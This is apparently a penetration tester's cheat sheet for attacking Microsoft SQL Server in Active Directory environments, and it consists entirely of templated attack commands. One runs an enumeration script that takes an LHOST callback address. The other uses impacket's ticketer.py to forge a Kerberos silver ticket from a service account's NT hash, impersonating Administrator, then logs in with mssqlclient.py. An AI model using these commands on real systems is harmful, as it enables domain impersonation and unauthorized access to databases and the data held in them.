# mssql
#target/remote #os/linux #cat/ad #proto/mssql #port/1433

## mssql enum
```
sqlcmd -C -S <fqdn> <auth> -y30 -Y30 -i ~/staging/enum.sql -v LHOST=<lhost>
```

## mssql service account exploitation
```
ticketer.py -spn MSSQLSvc/<fqdn> -domain-sid <domain_sid> -nthash <nt_hash> -domain <domain> -user-id <imp_user_id|500> <imp_user|Administrator> && export KRB5CCNAME=$(pwd)/<imp_user>.ccache && mssqlclient.py -k -no-pass -windows-auth <fqdn>
```
